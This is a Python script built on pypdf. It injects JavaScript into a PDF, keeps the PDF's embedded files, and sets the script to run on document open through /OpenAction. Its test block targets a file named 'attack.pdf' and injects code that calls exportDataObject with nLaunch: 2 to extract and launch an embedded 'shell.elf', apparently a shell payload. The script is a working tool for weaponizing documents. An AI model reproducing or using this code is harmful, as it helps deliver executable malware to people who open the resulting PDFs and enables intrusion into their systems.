import logging
import traceback
from pathlib import Path
from typing import Optional
from pydantic import BaseModel, FilePath
from pypdf import PdfReader, PdfWriter
from pypdf.generic import NameObject, DictionaryObject, TextStringObject, ArrayObject

# Set up logging
OUTPUT_DIR = Path("output")
OUTPUT_DIR.mkdir(exist_ok=True)
LOG_FILE = OUTPUT_DIR / "js_injector.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

def log_pdf_structure(reader: PdfReader, label: str):
    try:
        catalog = reader.trailer["/Root"]
        logging.info(f"[{label}] Catalog: {catalog}")
        print(f"[{label}] Catalog: {catalog}")
        # List attachments if present
        if "/Names" in catalog and "/EmbeddedFiles" in catalog["/Names"]:
            ef_dict = catalog["/Names"]["/EmbeddedFiles"]
            logging.info(f"[{label}] EmbeddedFiles: {ef_dict}")
            print(f"[{label}] EmbeddedFiles: {ef_dict}")
        # List JavaScript entries if present
        if "/Names" in catalog and "/JavaScript" in catalog["/Names"]:
            js_dict = catalog["/Names"]["/JavaScript"]
            logging.info(f"[{label}] JavaScript Names: {js_dict}")
            print(f"[{label}] JavaScript Names: {js_dict}")
        if "/OpenAction" in catalog:
            logging.info(f"[{label}] OpenAction: {catalog['/OpenAction']}")
            print(f"[{label}] OpenAction: {catalog['/OpenAction']}")
    except Exception as e:
        logging.warning(f"Could not log PDF structure for {label}: {e}")
        print(f"Could not log PDF structure for {label}: {e}")

class JSInjectorInput(BaseModel):
    input_pdf: FilePath
    output_pdf: Path
    js_code: str


def inject_javascript_to_pdf(input_pdf: FilePath, output_pdf: Path, js_code: str) -> bool:
    """
    Injects JavaScript into a PDF file and sets it to run on document open.
    Preserves /EmbeddedFiles in /Names dictionary.
    Args:
        input_pdf (FilePath): Path to the input PDF.
        output_pdf (Path): Path to the output PDF.
        js_code (str): JavaScript code to inject.
    Returns:
        bool: True if successful, False otherwise.
    """
    try:
        print(f"Reading input PDF: {input_pdf}")
        reader = PdfReader(str(input_pdf))
        log_pdf_structure(reader, "BEFORE INJECTION")
        writer = PdfWriter()
        for page in reader.pages:
            writer.add_page(page)
        # Prepare /Names dictionary
        input_catalog = reader.trailer["/Root"]
        names_dict = DictionaryObject()
        # Preserve /EmbeddedFiles if present
        if "/Names" in input_catalog:
            input_names = input_catalog["/Names"]
            if "/EmbeddedFiles" in input_names:
                ef = input_names["/EmbeddedFiles"]
                # Convert /Names list to ArrayObject if needed
                if "/Names" in ef and isinstance(ef["/Names"], list):
                    ef[NameObject("/Names")] = ArrayObject(ef["/Names"])
                names_dict[NameObject("/EmbeddedFiles")] = ef
        # Add /JavaScript
        js_entry = writer._add_object(DictionaryObject({
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): TextStringObject(js_code)
        }))
        js_names = DictionaryObject({
            NameObject("/Names"): ArrayObject([
                TextStringObject("js1"), js_entry
            ])
        })
        names_dict[NameObject("/JavaScript")] = js_names
        # Update /Names in root object
        writer._root_object.update({
            NameObject("/Names"): names_dict
        })
        # Explicitly set /OpenAction to run JS on document open
        writer._root_object.update({
            NameObject("/OpenAction"): DictionaryObject({
                NameObject("/S"): NameObject("/JavaScript"),
                NameObject("/JS"): TextStringObject(js_code)
            })
        })
        with open(output_pdf, "wb") as f_out:
            writer.write(f_out)
        print(f"Wrote output PDF: {output_pdf}")
        logging.info(f"Injected JS with OpenAction into {input_pdf} and saved as {output_pdf}")
        # Log/print output PDF structure
        out_reader = PdfReader(str(output_pdf))
        log_pdf_structure(out_reader, "AFTER INJECTION")
        return True
    except Exception as e:
        logging.error(f"Failed to inject JS: {e}\n{traceback.format_exc()}")
        print(f"Failed to inject JS: {e}\n{traceback.format_exc()}")
        return False


def main():
    """Test block for JS injection."""
    input_pdf = Path("pdfs/attack.pdf")
    output_pdf = OUTPUT_DIR / "attack_with_js.pdf"
    # JavaScript for a button: works in Adobe Reader, shows message in browsers
    js_code = (
        'if (typeof this.exportDataObject === "function") {'
        '    try {'
        '        this.exportDataObject({ cName: "shell.elf", nLaunch: 2 });'
        '    } catch (e) {'
        '        app.alert("Extraction failed: " + e);'
        '    }'
        '} else {'
        '    app.alert("This PDF must be opened in Adobe Acrobat Reader to extract the attachment.");'
        '}'
    )
    args = JSInjectorInput(
        input_pdf=input_pdf,
        output_pdf=output_pdf,
        js_code=js_code
    )
    success = inject_javascript_to_pdf(args.input_pdf, args.output_pdf, args.js_code)
    if success:
        print(f"Successfully injected JS. Output: {args.output_pdf}")
    else:
        print(f"Failed to inject JS. See log: {LOG_FILE}")

if __name__ == "__main__":
    main() 